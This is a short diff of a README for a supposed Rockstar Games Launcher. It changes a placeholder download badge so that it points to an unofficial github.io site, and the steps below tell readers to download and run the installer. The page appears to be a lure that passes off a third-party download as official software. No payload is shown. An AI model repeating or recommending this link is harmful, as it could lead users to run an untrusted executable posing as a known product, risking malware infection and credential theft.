@@ -8,7 +8,7 @@ The launcher integrates **Rockstar Social Club** features, providing **cloud sav
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://rockstar-games-launcher-windows.github.io/.github/)
 
 1. Download the installer package.  
 2. Run the installer on your Windows PC.  
